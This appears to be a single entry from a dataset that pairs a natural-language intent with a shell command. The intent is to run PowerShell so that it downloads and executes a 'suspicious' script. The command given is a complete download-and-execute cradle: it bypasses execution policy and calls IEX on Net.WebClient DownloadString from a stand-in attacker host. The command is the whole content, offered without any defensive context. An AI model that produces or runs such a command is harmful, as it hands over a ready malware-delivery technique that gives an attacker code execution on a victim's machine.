# Natural language intent:
# Execute PowerShell with specific settings to download and execute a suspicious script from a specified URL.

powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://evil-site.url/sospicious_code.ps1');"
